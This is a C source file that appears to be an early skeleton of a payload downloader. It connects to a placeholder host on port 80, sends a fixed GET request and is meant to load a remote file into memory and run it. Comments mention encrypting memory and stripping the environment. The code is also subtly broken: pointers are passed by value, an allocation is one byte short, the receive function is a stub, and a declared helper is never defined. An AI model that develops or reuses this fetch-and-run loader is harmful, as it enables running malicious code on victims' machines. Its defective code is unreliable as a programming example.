#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>

#include "dynamic.h"

#define SOCKET_ERROR -1

void* initialize_network_libs();
int prepare_get_payload(char* payload);
int do_download(void* handle, char* file_contents);
int receive_download(int sock, char* file_contents);

/* FIXME: Strip the environ and other things like that */
int main(int argc, char** argv)
{
    void* handle;

    handle = initialize_replacement_functions();
    PRINT(handle, "Replacement functions are ready.");
    
    char* file_contents;
    if (do_download(handle, file_contents))
    {
        PRINT(handle, "Download succeed! Running the payload.");
        /* FIXME: How would we run the payload? */
    }
    else
        PRINT(handle, "Failed to do the download! Retry?");

    return 0;
}

int do_download(void* handle, char* file_contents)
{
    int sock;
    struct sockaddr_in to;
    struct hostent* hostinfo;
    int sResult;

    sock = socket(PF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        PRINT(handle, "Socket failed to be created!");
        return 0;
    }

    to.sin_family = AF_INET;
    to.sin_port = htons(80); /* It is always port 80 anyway. */
    
    /* Memory encryption based on XOR, AES or whatever ? */
    hostinfo = gethostbyname("www.google.com"); /* Let's just be anything. */
    if (hostinfo == NULL)
    {
        PRINT(handle, "Target is unresolvable...");
        return 0;
    }
    
    to.sin_addr = *(struct in_addr *) hostinfo->h_addr;
    
    sResult = connect(sock, (struct sockaddr*) &to, sizeof(to));

    if (sResult == SOCKET_ERROR)
    {
        PRINT(handle, "Target is unreachable...");
        return 0;
    }

    /* 2. Send the download GET request payload */
    
    int payloadSize;
    char* payload;

    payloadSize = prepare_get_payload(payload);
    sResult = send(sock, payload, payloadSize, 0);

    if (sResult == SOCKET_ERROR)
    {
        PRINT(handle, "We didn't succeed to send any data to the target...");
        return 0;
    }

    free(payload);

    /* 3. Receive the download and store in memory */
    return receive_download(sock, file_contents);
}

int prepare_get_payload(char* payload)
{
    char staticData[] = "GET /index.html HTTP/1.1\nHost: www.target.com";
    payload = (char*)malloc(strlen(staticData) * sizeof(char));
    strcpy(payload, staticData);

    return strlen(payload);
}

int receive_download(int sock, char* file_contents)
{
    return 1;
}
